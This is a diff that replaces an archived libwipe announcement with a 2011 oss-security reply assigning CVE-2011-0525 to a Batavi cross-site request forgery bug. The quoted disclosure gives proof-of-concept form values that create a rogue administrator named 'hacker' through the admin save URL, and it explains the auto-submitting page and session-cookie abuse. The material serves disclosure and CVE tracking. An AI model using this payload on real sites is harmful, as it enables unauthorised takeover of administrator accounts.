@@ -1,39 +1,90 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2011/03/12/1
-Message-ID: <AANLkTi=v+miMDoy3my_MCw8-v=vdNLqx19DBuFMiCHpd@mail.gmail.com>
-Date: Sat, 12 Mar 2011 01:29:13 -0500
-From: Andrew Clausen <clausen@...n.upenn.edu>
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2011/01/27/3
+Message-ID: <220531087.170596.1296160278206.JavaMail.root@zmail01.collab.prod.int.phx2.redhat.com>
+Date: Thu, 27 Jan 2011 15:31:18 -0500 (EST)
+From: Josh Bressers <bressers@...hat.com>
 To: oss-security@...ts.openwall.com
-Subject: announcing libwipe
+Cc: coley <coley@...re.org>
+Subject: Re: Batavi 1.0 - XSRF bug fixed
 Content-Type: text/plain; charset=utf-8
 
-Hi all,
+Please use CVE-2011-0525 for this.
 
-I have written a program called "libwipe" for GNU/Linux to wipe memory
-as soon as it is not being used.  I am releasing it under the GPL3
-licence, and you can download it here:
+Thanks.
 
-http://www.econ.upenn.edu/~clausen/computing/libwipe.tar.gz
+-- 
+    JB
 
-Any suggestions are appreciated.  In particular, I would like feedback on
-* which memory mappings should be erased on exit
-* which project this could be included in (secure-delete?)
-
-OVERVIEW
-
-This library is designed to make programs respect users' privacy by wiping
-information when it is no longer needed.  It does not require any modifications
-to the original programs.  To use it for all programs in a single shell
-session, set the LD_PRELOAD environment variable with the shell command
-
-        export LD_PRELOAD=/usr/local/lib/libwipe.so
-
-To use it system-wide, add /usr/local/lib/libwipe.so to the /etc/ld.so.preload
-configure file.
-
-The program uses two mechanisms:
-(1) when memory is deallocated with free(3), it is zeroed out.
-(2) when the process terminates, the entire memory is zeroed out.
-
-Cheers,
-Andrew
+----- Original Message -----
+> Hi,
+> 
+> The open source project Batavi has just released their version 1.0
+> which has
+> fixed a XSRF exploit which was part of at least their latest alpha
+> release.
+> Just a quick snippet:
+> 
+> "is a specially prepared page containing a form with a couple of
+> hidden form values.
+> 
+> $title = "Batavi";
+> $uri =
+> "http://$host/admin/index.php?administrators&page=1&action=save"; [^
+> <http://$host/admin/index.php?administrators&page=1&action=save";> ]
+> $method = "post";
+> 
+> $values = array (
+> 'user_name' => "hacker",
+> 'user_password' => "b4t4v1",
+> 'first_name' => "Evil",
+> 'last_name' => "Hacker",
+> 'mail_address' => "evil.hacker@...mple.com",
+> 'configuration[MAX_DISPLAY_SEARCH_RESULTS]' => "20",
+> 'configuration[CATEGORY_PULL_DOWN_SHOW_PER_PAGE]' => "10, 20, 50,
+> 100",
+> 'configuration[PRODUCTS_SHOW_PRODUCTS_COUNT]' => "2",
+> 'configuration[PRODUCTS_SHOW_PRODUCTS_INCLUDING_SUBCATEGORIES]' =>
+> "1",
+> 'configuration[ADMIN_DEFAULT_LANGUAGE]' => "1",
+> 'configuration[SETTING_TINY_MCE]' => "2",
+> 'configuration[ADMINISTRATOR_STATE]' => "1",
+> 'configuration[ADMINISTRATOR_PRODUCT_TO_CATEGORIES]' => "1",
+> 'modules[]' => "*",
+> 'subaction' => "confirm"
+> );
+> 
+> Of course these PHP values are converted to an HTML form, this array
+> is
+> just for my own convenience. I have an XSRF framework to be able to
+> try
+> and demonstrate this type of attack quickly and clearly.
+> The HTML form is automatically submitted as soon as the page is
+> loaded.
+> If the user is visiting the specially prepared page when he is logged
+> in
+> as an administrator with sufficient permissions, his browser takes him
+> to the URL the form is submitted to, in this case
+> "http://batavi.cheatah.nl/$host/admin/index.php?administrators&page=1&action
+> =save",
+> <http://batavi.cheatah.nl/$host/admin/index.php?administrators&page=1&action
+> =save%22,> [^
+> <http://batavi.cheatah.nl/$host/admin/index.php?administrators&page=1&action
+> =save%22,> ]
+> and the browser decides to send along his original session cookie. So
+> for the application, everything seems in order. The user is logged in
+> and providing his session data, the IP address is even that of the
+> actual administrator. Only the HTTP_REFERER might be different, but
+> that
+> header cannot be trusted anyway, many client security software
+> packages
+> strip the Referrer header from HTTP requests, so often the header is
+> nonexistent or blank. You can't block people with blank referrers,
+> they
+> might be legitimate users, making use of provacy protection software."
+> 
+> As one of the people involved I know it's fixed now, but can we still
+> receive a CVE for the versions before V0.9.3 beta?
+> 
+> Thnx
+> 
+> Ronald
